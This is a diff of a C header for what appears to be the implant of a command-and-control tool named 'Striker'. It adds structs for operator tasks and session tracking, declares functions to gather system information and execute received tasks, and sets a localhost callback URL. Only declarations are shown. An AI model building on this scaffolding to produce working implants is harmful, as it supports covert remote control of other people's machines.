@@ -17,15 +17,9 @@
 #define STRIKER_DEBUG 1
 // The default URL. This is what the patcher will look for.
 #define URL_SIZE 512
-char baseURL[URL_SIZE] = "http://127.0.0.1:3000";
-
-/**
- * A struct for tracking some session info.
- */
-typedef struct{
-  char *uid;
-  unsigned long delay;
-} session;
+char baseURL[URL_SIZE] = "http://localhost:3000";
+// Max task result size in bytes
+#define MAX_RES_SIZE 102400
 
 /**
  * A struct for working with buffers.
@@ -34,31 +28,51 @@ typedef struct{
  * `used` is used to track number of bytes in use.
  */
 typedef struct{
-  char *buffer;
+  void *buffer;
   size_t size;
   size_t used;
 } buffer;
 
 /**
- * Create a new buffer of `size` bytes, and set the first byte to null.
+ * A struct for representing a single task.
+ */
+typedef struct{
+  char *uid;
+  char *type;
+  cJSON *data;
+  unsigned short completed;
+  cJSON *result;
+} task;
+
+/**
+ * A struct for tracking session info.
+ */
+typedef struct{
+  char *uid;
+  unsigned long delay;
+} session;
+
+/**
+ * Create a new buffer of `size` bytes, and initialize all it's bytes to null.
  * If `size` is zero, the call to malloc() will use 1 to still allocate some memory but buffer.size
  * and buffer.used will be kept at 0.
  */
 buffer *create_buffer(size_t size);
 
-// Resize a buffer.
+// Resize a buffer. It DOES NOT change the `used` property unless the `new_size` is less than it.
 void resize_buffer(buffer *buff, size_t new_size);
 
 /**
- * Append a string `src` to the end of a buffer `dest`.
- * Warning: This will treat `dest` and `str` as null-terminated strings, and also won't resize the buffer to fit.
+ * Append a max of `len` bytes from `src` to `dest` buffer.
+ * Note: resize_buffer() will be used to resize the dest buffer if not enough space is available.
+ * Returns the number of bytes appended.
  */
-void append_buffer(buffer *dest, const char *src);
+size_t append_buffer(buffer *dest, const void *src, size_t len);
 
 // Convert a buffer to a null-terminated string. Uses the `used` var to determine length.
 char *buffer_to_string(buffer *buff);
 
-// Free a buffer.
+// Free a buffer. Called when a buffer is no longer needed.
 void free_buffer(buffer *buff);
 
 /**
@@ -76,6 +90,12 @@ size_t body_receiver(void *chunk, size_t size, size_t nmemb, buffer *buff);
 
 // Return a json object containing system information.
 cJSON *sysinfo();
+
+// Parse a task JSON and return it, NULL on error.
+task *parse_task(cJSON *json);
+
+// Execute a task.
+void execute_task(task *t);
 
 // Starts the implant.
 void start_session();
